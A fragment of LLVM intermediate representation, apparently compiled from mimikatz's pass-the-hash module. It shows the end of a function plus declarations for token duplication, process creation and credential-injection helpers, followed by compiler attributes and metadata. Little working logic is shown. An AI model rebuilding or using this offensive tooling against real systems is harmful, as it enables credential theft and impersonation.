  call void @llvm.stackrestore(i8* %296)
  ret i32 %295
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i64 @kull_m_string_args_byName(i32, i32**, i8*, i32**, i8*) #3

declare dso_local i32 @wcstoul(i32*, i32*, i32) #3

declare dso_local i32 @kprintf(i8*, ...) #3

declare dso_local i32 @PRINT_ERROR(i8*) #3

declare dso_local i64 @kull_m_string_stringToHex(i32*, i32*, i32) #3

declare dso_local i32 @kull_m_string_wprintf_hex(i32*, i32, i32) #3

declare dso_local i32 @kuhl_m_sekurlsa_pth_luid(%struct.TYPE_10__*) #3

declare dso_local i64 @kull_m_process_create(i32, i32*, i32, i32*, i32, i32*, i32*, i8*, %struct.TYPE_11__*, i32) #3

declare dso_local i64 @OpenProcessToken(i32, i32, i32*) #3

declare dso_local i64 @GetTokenInformation(i32, i32, %struct.TYPE_9__*, i32, i32*) #3

declare dso_local i64 @DuplicateTokenEx(i32, i32, i32*, i32, i32, i32*) #3

declare dso_local i64 @SetThreadToken(i32*, i32) #3

declare dso_local i32 @PRINT_ERROR_AUTO(i8*) #3

declare dso_local i32 @CloseHandle(i32) #3

declare dso_local i32 @NtTerminateProcess(i32, i32) #3

declare dso_local i32 @NtResumeProcess(i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
